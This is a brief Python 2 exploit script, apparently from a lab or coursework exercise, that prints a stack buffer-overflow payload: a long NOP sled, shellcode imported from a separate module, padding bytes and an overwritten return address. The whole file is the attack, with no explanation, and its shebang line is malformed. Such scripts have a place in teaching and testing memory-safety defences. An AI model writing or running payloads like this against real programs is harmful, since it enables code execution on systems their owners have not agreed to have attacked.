#!/user/bin/bash/python

from struct import pack
from shellcode import shellcode

jump_addr = pack("<I", 0xbffef87d)

#shellcode = "f"*53
print "\x90"*971 + shellcode + "D"*12 + jump_addr



